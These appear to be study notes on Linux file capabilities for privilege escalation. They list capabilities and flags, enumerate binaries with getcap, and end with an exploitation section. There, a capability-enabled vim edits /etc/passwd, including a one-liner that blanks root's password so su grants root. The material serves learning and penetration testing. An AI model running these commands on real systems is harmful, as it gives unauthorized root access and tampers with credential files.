**Set Capability
```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
- Allows binding of ports when it is usually not allowed

Capabilities
- cap_sys_admin
  - Allows to perform actions with administrative privileges
- cap_sys_chroot
  - Allows to change the root directory for the current process
- cap_sys_ptrace
  - Allows to attach to and debug other processes  
- cap_sys_nice
  - Allows to raise or lower the priority of processes
- cap_sys_time
  - Allows to modify the system clock
- cap_sys_resource
  - Allows to modify system resource limits
- cap_sys_module
  - Allows to load and unload kernel modules
- cap_net_bind_service
  - Allows to bind to network ports

Values
- =
  - sets capability but does not grant any privileges  
- +ep
  - grants effective and permitted privileges
- +ei
  - grants inheritable privileges to child spawned processes
- +p
  - grants permitted privileges
 
**Linux privilege escalation capabilities
- cap_setuid
- cap_setgid
- cap_sys_admin
- cap_dac_override

**Enumerating capabilities
```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

**Exploitation
```shell-session
getcap /usr/bin/vim.basic
/usr/bin/vim.basic /etc/passwd
```
- Take out the 'x' in the line now we can use su to login to root

**Make changes in non-interactive mode
```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
```
- Take out the 'x' in the line now we can use su to login to root

